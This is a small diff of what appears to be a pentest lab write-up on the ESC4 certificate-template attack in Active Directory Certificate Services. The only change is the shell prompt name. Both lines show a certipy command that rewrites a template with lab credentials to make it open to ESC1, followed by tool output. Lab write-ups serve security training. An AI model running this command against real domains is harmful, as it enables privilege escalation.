@@ -5,7 +5,7 @@ ESC4 exploits certificate templates in Active Directory Certificate Services (AD
 Saving the template and making it vulnerable to the ESC1 attack:
 
 ```bash
-gareth@gareth:~/pentest/GOAD/esc3$ certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old -dc-ip 192.168.56.12
+garffff@garffff:~/pentest/GOAD/esc3$ certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old -dc-ip 192.168.56.12
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Saved old configuration for 'ESC4' to 'ESC4.json'
